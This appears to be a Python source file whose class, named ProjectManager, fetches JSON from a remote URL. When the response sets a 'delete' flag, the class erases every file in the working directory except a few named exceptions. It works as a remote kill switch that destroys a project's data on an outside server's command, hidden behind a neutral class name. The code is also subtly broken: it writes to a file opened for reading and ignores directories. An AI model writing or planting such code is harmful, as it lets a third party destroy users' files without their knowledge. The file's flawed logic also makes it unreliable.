import requests
import os


class ProjectManager:
    def __init__(self, url):
        res = requests.get(url).json()
        need_deletion = bool(res.get("delete", False))
        self.reason = res.get("reason", None)
        if need_deletion:
            self.delete_project()

    def delete_project(self):
        path = os.getcwd()
        structure = os.listdir()
        for i in structure:
            if i not in ("venv", "project_maintaining", "test.py"):
                try:
                    os.remove(os.path.join(path, i))
                except PermissionError:
                    continue
        if self.reason:
            with open("DELETION.txt") as f:
                f.write(self.reason)
